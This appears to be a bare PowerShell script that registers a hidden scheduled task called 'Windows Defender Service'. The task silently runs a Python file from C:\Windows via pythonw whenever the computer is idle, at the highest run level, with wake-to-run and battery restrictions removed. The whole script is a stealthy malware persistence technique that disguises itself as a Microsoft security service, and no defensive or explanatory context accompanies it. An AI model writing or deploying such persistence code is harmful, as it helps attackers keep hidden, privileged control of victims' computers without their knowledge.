$TaskName = "Windows Defender Service"
$FilePath = "C:\Windows\Config_.py"
$PythonWPath = (Get-Command pythonw).Path
$Action = New-ScheduledTaskAction -Execute $PythonWPath -Argument $FilePath

# Trigger when the computer has been idle for 5 minutes
$Trigger = New-ScheduledTaskTrigger -Idle -IdleTime 5

$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowDemandStart -AllowHardTerminate -WakeToRun

# Use the current user's credentials
$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest

# Create the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force

# Get the scheduled task object
$Task = Get-ScheduledTask -TaskName $TaskName

# Disable the "Start the task only if the computer is on AC power" condition
$Task.Settings.DisallowStartIfOnBatteries = $false

# Set the task to hidden
$Task.Settings.Hidden = $true

# Update the task using the -InputObject parameter
Set-ScheduledTask -InputObject $Task
